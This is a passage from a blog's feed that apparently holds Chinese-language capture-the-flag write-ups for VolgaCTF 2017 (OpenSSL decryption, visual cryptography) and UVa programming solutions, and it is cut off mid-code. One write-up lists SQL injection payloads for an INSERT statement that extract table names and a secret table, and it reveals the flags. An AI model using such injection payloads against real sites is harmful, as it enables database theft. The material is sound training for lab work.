<h1 id="大坑"><a href="#大坑" class="headerlink" title="大坑"></a>大坑</h1><p>官方後來才給了Hints，說明是用最新版<code>OpenSSL 1.1.0e</code>做加密的，但目前的套件管理工具都是存<code>OpenSSL 1.0.2b</code>版本，要裝要自己拿source來編，結果一怒之下就找了個 <a href="https://www.tutorialspoint.com/unix_terminal_online.php" target="_blank" rel="external">online unix terminal (TutorialsPoint)</a> 來用了，載source編譯在local安裝，最後跑解密成功。</p>
<p>一開始嘗試了舊版沒辦法解密，原因出在舊版用passphrase去產生key時的implementation中default是用了md5做hash，而新版的則是用sha256。</p>
<p>詳情可以看這個openssl github的commit：<br><a href="https://github.com/openssl/openssl/commit/f8547f62c212837dbf44fb7e2755e5774a59a57b" target="_blank" rel="external">https://github.com/openssl/openssl/commit/f8547f62c212837dbf44fb7e2755e5774a59a57b</a></p>
<p>後來在stackoverflow找到了這篇：<br><a href="http://stackoverflow.com/questions/39637388/encryption-decryption-doesnt-work-well-between-two-different-openssl-versions" target="_blank" rel="external">Encryption/decryption doesn’t work well between two different openssl versions</a><br>再看一下openssl -md的說明：<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">-md            <span class="keyword">the</span> next argument is <span class="keyword">the</span> md <span class="built_in">to</span> use <span class="built_in">to</span> <span class="built_in">create</span> <span class="keyword">a</span> key</div><div class="line">                 <span class="built_in">from</span> <span class="keyword">a</span> passphrase.  One <span class="keyword">of</span> md2, md5, sha <span class="keyword">or</span> sha1</div></pre></td></tr></table></figure></p>
<p>因此如果要用舊版解密要加上<code>-md sha256</code>，嘗試一下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">openssl enc -aes-128-cbc <span class="_">-d</span> -in flag.zip.enc -out flag.zip -k <span class="string">"\M)R&lt;.DDe/:;d&gt;JZP"</span> -md sha256</div></pre></td></tr></table></figure></p>
<p>解密成功！</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;題目資訊&quot;&gt;&lt;a href=&quot;#題目資訊&quot; class=&quot;headerlink&quot; title=&quot;題目資訊&quot;&gt;&lt;/a&gt;題目資訊&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;Category: Crypto + Reverse&lt;br&gt;Point: 100&lt;br&gt;Description:&lt;br&gt;For reasons unknown an amature cryptographer wrote an application to generate “strong encryption keys”. One of these keys was used to encrypt a tar archive with the flag. They used openssl command line util with -aes-128-cbc. Could you please get the flag? It shouldn’t take much time…&lt;br&gt;&lt;a href=&quot;https://quals.2017.volgactf.ru/files/v5nxjyisi75bjdnc9nrbiocmxjvosk2v/flag.zip.enc&quot;&gt;flag.zip.enc&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://quals.2017.volgactf.ru/files/v5nxjyisi75bjdnc9nrbiocmxjvosk2v/keypass&quot;&gt;keypass&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Hints&lt;/strong&gt;&lt;br&gt;&lt;figure class=&quot;highlight lsl&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;$ openssl&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;OpenSSL&amp;gt; version&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;OpenSSL &lt;span class=&quot;number&quot;&gt;1.1&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;.0&lt;/span&gt;e  &lt;span class=&quot;number&quot;&gt;16&lt;/span&gt; Feb &lt;span class=&quot;number&quot;&gt;2017&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="CTF Write-ups" scheme="https://andyw330.github.io/categories/CTF-Write-ups/"/>
    
    
      <category term="VolgaCTF 2017 Quals" scheme="https://andyw330.github.io/tags/VolgaCTF-2017-Quals/"/>
    
      <category term="Crypto" scheme="https://andyw330.github.io/tags/Crypto/"/>
    
      <category term="Reverse" scheme="https://andyw330.github.io/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>[VolgaCTF 2017 Quals] - Bloody Feedback 100</title>
    <link href="https://andyw330.github.io/2017/03/31/VolgaCTF-2017-Quals-Bloody-Feedback-100/"/>
    <id>https://andyw330.github.io/2017/03/31/VolgaCTF-2017-Quals-Bloody-Feedback-100/</id>
    <published>2017-03-30T16:32:00.000Z</published>
    <updated>2017-03-30T18:19:07.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="題目資訊"><a href="#題目資訊" class="headerlink" title="題目資訊"></a>題目資訊</h1><blockquote>
<p>Category: Web<br>Point: 100<br>Description: Send your feedback at <a href="http://bloody-feedback.quals.2017.volgactf.ru" target="_blank" rel="external">bloody-feedback.quals.2017.volgactf.ru</a></p>
</blockquote>
<a id="more"></a>
<h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><p>網站給了一個表單，input欄位分別是 name, email, feedback message，填寫的表單最後會被顯示在公開佈告欄。<br>使用者發送表單後後端會回傳個隨機網址，點進網址可以查看目前feedback message的狀態，看是不是已經被放到公開佈告欄了。</p>
<p>發送一般的request後，status會顯示<code>not processed</code><br>POST: <code>name=a&amp;email=b&amp;message=c</code><br><img src="/2017/03/31/VolgaCTF-2017-Quals-Bloody-Feedback-100/original.png" alt="normal request" title="normal request"></p>
<p>試了一下，在email欄插入<code>&#39;</code>就會造成error，還可以看到各個input欄位分別是甚麼。<br>POST: <code>name=a&amp;email=b&#39;&amp;message=c</code><br><img src="/2017/03/31/VolgaCTF-2017-Quals-Bloody-Feedback-100/single_quotation.png" alt="with single quotation" title="with single quotation"></p>
<p>從上面可以分析出來該sql語句應該是<br><code>INSERT INTO … VALUE($code, $name, $message, $email, &#39;not processed&#39;)</code><br>所以只要把最後的<code>not processed</code>部分改插我們想要的東西，再來把後面註解掉，就會顯示出來了！<br>POST: <code>name=a&amp;email=b&#39;, &#39;Hello World!&#39;) --&amp;message=c</code><br><img src="/2017/03/31/VolgaCTF-2017-Quals-Bloody-Feedback-100/arbitrary_text.png" alt="show arbitrary text" title="show arbitrary text"></p>
<p>成功了！先拿table<br>POST: <code>name=a&amp;email=b&#39;, (Select table_name from information_schema.tables limit 1 offset 1)) --&amp;message=c</code><br><img src="/2017/03/31/VolgaCTF-2017-Quals-Bloody-Feedback-100/table.png" alt="show table" title="show table"></p>
<p>最後拿flag<br>POST: <code>name=a&amp;email=b&#39;, (SELECT * FROM s3cret_tabl3 limit 1 offset 4)) --&amp;message=c</code><br><img src="/2017/03/31/VolgaCTF-2017-Quals-Bloody-Feedback-100/flag.png" alt="get flag" title="get flag"><br>Flag: <code>VolgaCTF{eiU7UJhyeu@ud3*}</code></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;題目資訊&quot;&gt;&lt;a href=&quot;#題目資訊&quot; class=&quot;headerlink&quot; title=&quot;題目資訊&quot;&gt;&lt;/a&gt;題目資訊&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;Category: Web&lt;br&gt;Point: 100&lt;br&gt;Description: Send your feedback at &lt;a href=&quot;http://bloody-feedback.quals.2017.volgactf.ru&quot;&gt;bloody-feedback.quals.2017.volgactf.ru&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="CTF Write-ups" scheme="https://andyw330.github.io/categories/CTF-Write-ups/"/>
    
    
      <category term="Web" scheme="https://andyw330.github.io/tags/Web/"/>
    
      <category term="VolgaCTF 2017 Quals" scheme="https://andyw330.github.io/tags/VolgaCTF-2017-Quals/"/>
    
  </entry>
  
  <entry>
    <title>[VolgaCTF 2017 Quals] - VC 50</title>
    <link href="https://andyw330.github.io/2017/03/30/VolgaCTF-2017-Quals-VC-50/"/>
    <id>https://andyw330.github.io/2017/03/30/VolgaCTF-2017-Quals-VC-50/</id>
    <published>2017-03-30T09:47:00.000Z</published>
    <updated>2017-03-31T06:04:05.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="題目資訊"><a href="#題目資訊" class="headerlink" title="題目資訊"></a>題目資訊</h1><blockquote>
<p>Category: Crypto<br>Point: 50<br>Description: There are files A.png and B.png. But where’s the flag?</p>
</blockquote>
<a id="more"></a>
<p>題目給的兩個 png 檔案：</p>
<img src="/2017/03/30/VolgaCTF-2017-Quals-VC-50/A.png" alt="A.png" title="A.png">
<img src="/2017/03/30/VolgaCTF-2017-Quals-VC-50/B.png" alt="B.png" title="B.png">
<h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><p>方法很多，用<code>ImageMagick</code>的<code>compare</code>或是用<code>python PIL</code>都可以解，我是用前者解的。<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">compare -compose src A<span class="selector-class">.png</span> B<span class="selector-class">.png</span> output.png</div></pre></td></tr></table></figure></p>
<p>然後就會得到下面這張圖：</p>
<img src="/2017/03/30/VolgaCTF-2017-Quals-VC-50/output.png" alt="compare output image" title="compare output image">
<p>Flag: <code>VolgaCTF{Classic_secret_sharing_scheme}</code></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;題目資訊&quot;&gt;&lt;a href=&quot;#題目資訊&quot; class=&quot;headerlink&quot; title=&quot;題目資訊&quot;&gt;&lt;/a&gt;題目資訊&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;Category: Crypto&lt;br&gt;Point: 50&lt;br&gt;Description: There are files A.png and B.png. But where’s the flag?&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="CTF Write-ups" scheme="https://andyw330.github.io/categories/CTF-Write-ups/"/>
    
    
      <category term="VolgaCTF 2017 Quals" scheme="https://andyw330.github.io/tags/VolgaCTF-2017-Quals/"/>
    
      <category term="Crypto" scheme="https://andyw330.github.io/tags/Crypto/"/>
    
      <category term="Visual Cryptography" scheme="https://andyw330.github.io/tags/Visual-Cryptography/"/>
    
  </entry>
  
  <entry>
    <title>UVa 11559 - Event Planning</title>
    <link href="https://andyw330.github.io/2017/03/13/UVa-11559-Event-Planning/"/>
    <id>https://andyw330.github.io/2017/03/13/UVa-11559-Event-Planning/</id>
    <published>2017-03-12T16:50:00.000Z</published>
    <updated>2017-03-30T16:27:35.000Z</updated>
    
    <content type="html"><![CDATA[<p>題目連結：<a href="https://uva.onlinejudge.org/index.php?option=com_onlinejudge&amp;Itemid=8&amp;category=24&amp;page=show_problem&amp;problem=2595" target="_blank" rel="external">UVa 11559 - Event Planning</a><br><a id="more"></a></p>
<h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><p>時間複雜度O(hw)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> n, b, h, w, p, a, cost, i;</div><div class="line">    <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">"%d %d %d %d"</span>, &amp;n, &amp;b, &amp;h, &amp;w) &gt; <span class="number">0</span>) &#123;</div><div class="line">        cost = <span class="number">1e9</span>;</div><div class="line">        <span class="keyword">while</span> (h--) &#123;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;p);</div><div class="line">            <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; w; ++i) &#123;</div><div class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;a);</div><div class="line">                <span class="keyword">if</span> (a &gt;= n &amp;&amp; b &gt;= n * p &amp;&amp; cost &gt; n * p)</div><div class="line">                    cost = n * p;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span> (cost == <span class="number">1e9</span>)</div><div class="line">            <span class="built_in">puts</span>(<span class="string">"stay home"</span>);</div><div class="line">        <span class="keyword">else</span></div><div class="line">            <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, cost);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;題目連結：&lt;a href=&quot;https://uva.onlinejudge.org/index.php?option=com_onlinejudge&amp;amp;Itemid=8&amp;amp;category=24&amp;amp;page=show_problem&amp;amp;problem=2595&quot;&gt;UVa 11559 - Event Planning&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Online Judge" scheme="https://andyw330.github.io/categories/Online-Judge/"/>
    
    
      <category term="UVa" scheme="https://andyw330.github.io/tags/UVa/"/>
    
  </entry>
  
  <entry>
    <title>UVa 579 - Clock Hands</title>
    <link href="https://andyw330.github.io/2017/03/12/UVa-579-Clock-Hands/"/>
    <id>https://andyw330.github.io/2017/03/12/UVa-579-Clock-Hands/</id>
    <published>2017-03-12T13:53:00.000Z</published>
    <updated>2017-03-30T16:27:41.000Z</updated>
    
    <content type="html"><![CDATA[<p>題目連結：<a href="https://uva.onlinejudge.org/index.php?option=com_onlinejudge&amp;Itemid=8&amp;category=24&amp;page=show_problem&amp;problem=520" target="_blank" rel="external">UVa 579 - Clock Hands</a></p>
<h1 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h1><p>直接算角度相減，輸出小於等於180度角的部分 (0.030s)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> h, m;</div><div class="line">    <span class="keyword">float</span> ang1, ang2, ans;</div><div class="line">    <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">"%d:%d"</span>, &amp;h, &amp;m), h || m) &#123;</div><div class="line">        ang1 = h * <span class="number">30</span> + m * <span class="number">0.5</span>;</div><div class="line">        ang2 = m * <span class="number">6</span>;</div><div class="line">        ans = <span class="built_in">fabs</span>(ang1 - ang2);</div><div class="line">        <span class="keyword">if</span> (ans &gt; <span class="number">180</span>)</div><div class="line">            ans = <span class="number">360</span> - ans;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%.3f\n"</span>, ans);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="解法2"><a href="#解法2" class="headerlink" title="解法2"></a>解法2</h1><p>直接建table做查找 (0.000s)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">char</span> table[<span class="number">13</span>][<span class="number">60</span>][<span class="number">8</span>] = &#123;</div><div class="line">    &#123;<span class="string">"0.000"</span>, <span class="string">"5.500"</span>, <span class="string">"11.000"</span>, <span class="string">"16.500"</span>, <span class="string">"22.000"</span>, <span class="string">"27.500"</span>, <span class="string">"33.000"</span>, <span class="string">"38.500"</span>, <span class="string">"44.000"</span>, <span class="string">"49.500"</span>, <span class="string">"55.000"</span>, <span class="string">"60.500"</span>, <span class="string">"66.000"</span>, <span class="string">"71.500"</span>, <span class="string">"77.000"</span>, <span class="string">"82.500"</span>, <span class="string">"88.000"</span>, <span class="string">"93.500"</span>, <span class="string">"99.000"</span>, <span class="string">"104.500"</span>, <span class="string">"110.000"</span>, <span class="string">"115.500"</span>, <span class="string">"121.000"</span>, <span class="string">"126.500"</span>, <span class="string">"132.000"</span>, <span class="string">"137.500"</span>, <span class="string">"143.000"</span>, <span class="string">"148.500"</span>, <span class="string">"154.000"</span>, <span class="string">"159.500"</span>, <span class="string">"165.000"</span>, <span class="string">"170.500"</span>, <span class="string">"176.000"</span>, <span class="string">"178.500"</span>, <span class="string">"173.000"</span>, <span class="string">"167.500"</span>, <span class="string">"162.000"</span>, <span class="string">"156.500"</span>, <span class="string">"151.000"</span>, <span class="string">"145.500"</span>, <span class="string">"140.000"</span>, <span class="string">"134.500"</span>, <span class="string">"129.000"</span>, <span class="string">"123.500"</span>, <span class="string">"118.000"</span>, <span class="string">"112.500"</span>, <span class="string">"107.000"</span>, <span class="string">"101.500"</span>, <span class="string">"96.000"</span>, <span class="string">"90.500"</span>, <span class="string">"85.000"</span>, <span class="string">"79.500"</span>, <span class="string">"74.000"</span>, <span class="string">"68.500"</span>, <span class="string">"63.000"</span>, <span class="string">"57.500"</span>, <span class="string">"52.000"</span>, <span class="string">"46.500"</span>, <span class="string">"41.000"</span>, <span class="string">"35.500"</span>&#125;,</div><div class="line">    &#123;<span class="string">"30.000"</span>, <span class="string">"24.500"</span>, <span class="string">"19.000"</span>, <span class="string">"13.500"</span>, <span class="string">"8.000"</span>, <span class="string">"2.500"</span>, <span class="string">"3.000"</span>, <span class="string">"8.500"</span>, <span class="string">"14.000"</span>, <span class="string">"19.500"</span>, <span class="string">"25.000"</span>, <span class="string">"30.500"</span>, <span class="string">"36.000"</span>, <span class="string">"41.500"</span>, <span class="string">"47.000"</span>, <span class="string">"52.500"</span>, <span class="string">"58.000"</span>, <span class="string">"63.500"</span>, <span class="string">"69.000"</span>, <span class="string">"74.500"</span>, <span class="string">"80.000"</span>, <span class="string">"85.500"</span>, <span class="string">"91.000"</span>, <span class="string">"96.500"</span>, <span class="string">"102.000"</span>, <span class="string">"107.500"</span>, <span class="string">"113.000"</span>, <span class="string">"118.500"</span>, <span class="string">"124.000"</span>, <span class="string">"129.500"</span>, <span class="string">"135.000"</span>, <span class="string">"140.500"</span>, <span class="string">"146.000"</span>, <span class="string">"151.500"</span>, <span class="string">"157.000"</span>, <span class="string">"162.500"</span>, <span class="string">"168.000"</span>, <span class="string">"173.500"</span>, <span class="string">"179.000"</span>, <span class="string">"175.500"</span>, <span class="string">"170.000"</span>, <span class="string">"164.500"</span>, <span class="string">"159.000"</span>, <span class="string">"153.500"</span>, <span class="string">"148.000"</span>, <span class="string">"142.500"</span>, <span class="string">"137.000"</span>, <span class="string">"131.500"</span>, <span class="string">"126.000"</span>, <span class="string">"120.500"</span>, <span class="string">"115.000"</span>, <span class="string">"109.500"</span>, <span class="string">"104.000"</span>, <span class="string">"98.500"</span>, <span class="string">"93.000"</span>, <span class="string">"87.500"</span>, <span class="string">"82.000"</span>, <span class="string">"76.500"</span>, <span class="string">"71.000"</span>, <span class="string">"65.500"</span>&#125;,</div><div class="line">    &#123;<span class="string">"60.000"</span>, <span class="string">"54.500"</span>, <span class="string">"49.000"</span>, <span class="string">"43.500"</span>, <span class="string">"38.000"</span>, <span class="string">"32.500"</span>, <span class="string">"27.000"</span>, <span class="string">"21.500"</span>, <span class="string">"16.000"</span>, <span class="string">"10.500"</span>, <span class="string">"5.000"</span>, <span class="string">"0.500"</span>, <span class="string">"6.000"</span>, <span class="string">"11.500"</span>, <span class="string">"17.000"</span>, <span class="string">"22.500"</span>, <span class="string">"28.000"</span>, <span class="string">"33.500"</span>, <span class="string">"39.000"</span>, <span class="string">"44.500"</span>, <span class="string">"50.000"</span>, <span class="string">"55.500"</span>, <span class="string">"61.000"</span>, <span class="string">"66.500"</span>, <span class="string">"72.000"</span>, <span class="string">"77.500"</span>, <span class="string">"83.000"</span>, <span class="string">"88.500"</span>, <span class="string">"94.000"</span>, <span class="string">"99.500"</span>, <span class="string">"105.000"</span>, <span class="string">"110.500"</span>, <span class="string">"116.000"</span>, <span class="string">"121.500"</span>, <span class="string">"127.000"</span>, <span class="string">"132.500"</span>, <span class="string">"138.000"</span>, <span class="string">"143.500"</span>, <span class="string">"149.000"</span>, <span class="string">"154.500"</span>, <span class="string">"160.000"</span>, <span class="string">"165.500"</span>, <span class="string">"171.000"</span>, <span class="string">"176.500"</span>, <span class="string">"178.000"</span>, <span class="string">"172.500"</span>, <span class="string">"167.000"</span>, <span class="string">"161.500"</span>, <span class="string">"156.000"</span>, <span class="string">"150.500"</span>, <span class="string">"145.000"</span>, <span class="string">"139.500"</span>, <span class="string">"134.000"</span>, <span class="string">"128.500"</span>, <span class="string">"123.000"</span>, <span class="string">"117.500"</span>, <span class="string">"112.000"</span>, <span class="string">"106.500"</span>, <span class="string">"101.000"</span>, <span class="string">"95.500"</span>&#125;,</div><div class="line">    &#123;<span class="string">"90.000"</span>, <span class="string">"84.500"</span>, <span class="string">"79.000"</span>, <span class="string">"73.500"</span>, <span class="string">"68.000"</span>, <span class="string">"62.500"</span>, <span class="string">"57.000"</span>, <span class="string">"51.500"</span>, <span class="string">"46.000"</span>, <span class="string">"40.500"</span>, <span class="string">"35.000"</span>, <span class="string">"29.500"</span>, <span class="string">"24.000"</span>, <span class="string">"18.500"</span>, <span class="string">"13.000"</span>, <span class="string">"7.500"</span>, <span class="string">"2.000"</span>, <span class="string">"3.500"</span>, <span class="string">"9.000"</span>, <span class="string">"14.500"</span>, <span class="string">"20.000"</span>, <span class="string">"25.500"</span>, <span class="string">"31.000"</span>, <span class="string">"36.500"</span>, <span class="string">"42.000"</span>, <span class="string">"47.500"</span>, <span class="string">"53.000"</span>, <span class="string">"58.500"</span>, <span class="string">"64.000"</span>, <span class="string">"69.500"</span>, <span class="string">"75.000"</span>, <span class="string">"80.500"</span>, <span class="string">"86.000"</span>, <span class="string">"91.500"</span>, <span class="string">"97.000"</span>, <span class="string">"102.500"</span>, <span class="string">"108.000"</span>, <span class="string">"113.500"</span>, <span class="string">"119.000"</span>, <span class="string">"124.500"</span>, <span class="string">"130.000"</span>, <span class="string">"135.500"</span>, <span class="string">"141.000"</span>, <span class="string">"146.500"</span>, <span class="string">"152.000"</span>, <span class="string">"157.500"</span>, <span class="string">"163.000"</span>, <span class="string">"168.500"</span>, <span class="string">"174.000"</span>, <span class="string">"179.500"</span>, <span class="string">"175.000"</span>, <span class="string">"169.500"</span>, <span class="string">"164.000"</span>, <span class="string">"158.500"</span>, <span class="string">"153.000"</span>, <span class="string">"147.500"</span>, <span class="string">"142.000"</span>, <span class="string">"136.500"</span>, <span class="string">"131.000"</span>, <span class="string">"125.500"</span>&#125;,</div><div class="line">    &#123;<span class="string">"120.000"</span>, <span class="string">"114.500"</span>, <span class="string">"109.000"</span>, <span class="string">"103.500"</span>, <span class="string">"98.000"</span>, <span class="string">"92.500"</span>, <span class="string">"87.000"</span>, <span class="string">"81.500"</span>, <span class="string">"76.000"</span>, <span class="string">"70.500"</span>, <span class="string">"65.000"</span>, <span class="string">"59.500"</span>, <span class="string">"54.000"</span>, <span class="string">"48.500"</span>, <span class="string">"43.000"</span>, <span class="string">"37.500"</span>, <span class="string">"32.000"</span>, <span class="string">"26.500"</span>, <span class="string">"21.000"</span>, <span class="string">"15.500"</span>, <span class="string">"10.000"</span>, <span class="string">"4.500"</span>, <span class="string">"1.000"</span>, <span class="string">"6.500"</span>, <span class="string">"12.000"</span>, <span class="string">"17.500"</span>, <span class="string">"23.000"</span>, <span class="string">"28.500"</span>, <span class="string">"34.000"</span>, <span class="string">"39.500"</span>, <span class="string">"45.000"</span>, <span class="string">"50.500"</span>, <span class="string">"56.000"</span>, <span class="string">"61.500"</span>, <span class="string">"67.000"</span>, <span class="string">"72.500"</span>, <span class="string">"78.000"</span>, <span class="string">"83.500"</span>, <span class="string">"89.000"</span>, <span class="string">"94.500"</span>, <span class="string">"100.000"</span>, <span class="string">"105.500"</span>, <span class="string">"111.000"</span>, <span class="string">"116.500"</span>, <span class="string">"122.000"</span>, <span class="string">"127.500"</span>, <span class="string">"133.000"</span>, <span class="string">"138.500"</span>, <span class="string">"144.000"</span>, <span class="string">"149.500"</span>, <span class="string">"155.000"</span>, <span class="string">"160.500"</span>, <span class="string">"166.000"</span>, <span class="string">"171.500"</span>, <span class="string">"177.000"</span>, <span class="string">"177.500"</span>, <span class="string">"172.000"</span>, <span class="string">"166.500"</span>, <span class="string">"161.000"</span>, <span class="string">"155.500"</span>&#125;,</div><div class="line">    &#123;<span class="string">"150.000"</span>, <span class="string">"144.500"</span>, <span class="string">"139.000"</span>, <span class="string">"133.500"</span>, <span class="string">"128.000"</span>, <span class="string">"122.500"</span>, <span class="string">"117.000"</span>, <span class="string">"111.500"</span>, <span class="string">"106.000"</span>, <span class="string">"100.500"</span>, <span class="string">"95.000"</span>, <span class="string">"89.500"</span>, <span class="string">"84.000"</span>, <span class="string">"78.500"</span>, <span class="string">"73.000"</span>, <span class="string">"67.500"</span>, <span class="string">"62.000"</span>, <span class="string">"56.500"</span>, <span class="string">"51.000"</span>, <span class="string">"45.500"</span>, <span class="string">"40.000"</span>, <span class="string">"34.500"</span>, <span class="string">"29.000"</span>, <span class="string">"23.500"</span>, <span class="string">"18.000"</span>, <span class="string">"12.500"</span>, <span class="string">"7.000"</span>, <span class="string">"1.500"</span>, <span class="string">"4.000"</span>, <span class="string">"9.500"</span>, <span class="string">"15.000"</span>, <span class="string">"20.500"</span>, <span class="string">"26.000"</span>, <span class="string">"31.500"</span>, <span class="string">"37.000"</span>, <span class="string">"42.500"</span>, <span class="string">"48.000"</span>, <span class="string">"53.500"</span>, <span class="string">"59.000"</span>, <span class="string">"64.500"</span>, <span class="string">"70.000"</span>, <span class="string">"75.500"</span>, <span class="string">"81.000"</span>, <span class="string">"86.500"</span>, <span class="string">"92.000"</span>, <span class="string">"97.500"</span>, <span class="string">"103.000"</span>, <span class="string">"108.500"</span>, <span class="string">"114.000"</span>, <span class="string">"119.500"</span>, <span class="string">"125.000"</span>, <span class="string">"130.500"</span>, <span class="string">"136.000"</span>, <span class="string">"141.500"</span>, <span class="string">"147.000"</span>, <span class="string">"152.500"</span>, <span class="string">"158.000"</span>, <span class="string">"163.500"</span>, <span class="string">"169.000"</span>, <span class="string">"174.500"</span>&#125;,</div><div class="line">    &#123;<span class="string">"180.000"</span>, <span class="string">"174.500"</span>, <span class="string">"169.000"</span>, <span class="string">"163.500"</span>, <span class="string">"158.000"</span>, <span class="string">"152.500"</span>, <span class="string">"147.000"</span>, <span class="string">"141.500"</span>, <span class="string">"136.000"</span>, <span class="string">"130.500"</span>, <span class="string">"125.000"</span>, <span class="string">"119.500"</span>, <span class="string">"114.000"</span>, <span class="string">"108.500"</span>, <span class="string">"103.000"</span>, <span class="string">"97.500"</span>, <span class="string">"92.000"</span>, <span class="string">"86.500"</span>, <span class="string">"81.000"</span>, <span class="string">"75.500"</span>, <span class="string">"70.000"</span>, <span class="string">"64.500"</span>, <span class="string">"59.000"</span>, <span class="string">"53.500"</span>, <span class="string">"48.000"</span>, <span class="string">"42.500"</span>, <span class="string">"37.000"</span>, <span class="string">"31.500"</span>, <span class="string">"26.000"</span>, <span class="string">"20.500"</span>, <span class="string">"15.000"</span>, <span class="string">"9.500"</span>, <span class="string">"4.000"</span>, <span class="string">"1.500"</span>, <span class="string">"7.000"</span>, <span class="string">"12.500"</span>, <span class="string">"18.000"</span>, <span class="string">"23.500"</span>, <span class="string">"29.000"</span>, <span class="string">"34.500"</span>, <span class="string">"40.000"</span>, <span class="string">"45.500"</span>, <span class="string">"51.000"</span>, <span class="string">"56.500"</span>, <span class="string">"62.000"</span>, <span class="string">"67.500"</span>, <span class="string">"73.000"</span>, <span class="string">"78.500"</span>, <span class="string">"84.000"</span>, <span class="string">"89.500"</span>, <span class="string">"95.000"</span>, <span class="string">"100.500"</span>, <span class="string">"106.000"</span>, <span class="string">"111.500"</span>, <span class="string">"117.000"</span>, <span class="string">"122.500"</span>, <span class="string">"128.000"</span>, <span class="string">"133.500"</span>, <span class="string">"139.000"</span>, <span class="string">"144.500"</span>&#125;,</div><div class="line">    &#123;<span class="string">"150.000"</span>, <span class="string">"155.500"</span>, <span class="string">"161.000"</span>, <span class="string">"166.500"</span>, <span class="string">"172.000"</span>, <span class="string">"177.500"</span>, <span class="string">"177.000"</span>, <span class="string">"171.500"</span>, <span class="string">"166.000"</span>, <span class="string">"160.500"</span>, <span class="string">"155.000"</span>, <span class="string">"149.500"</span>, <span class="string">"144.000"</span>, <span class="string">"138.500"</span>, <span class="string">"133.000"</span>, <span class="string">"127.500"</span>, <span 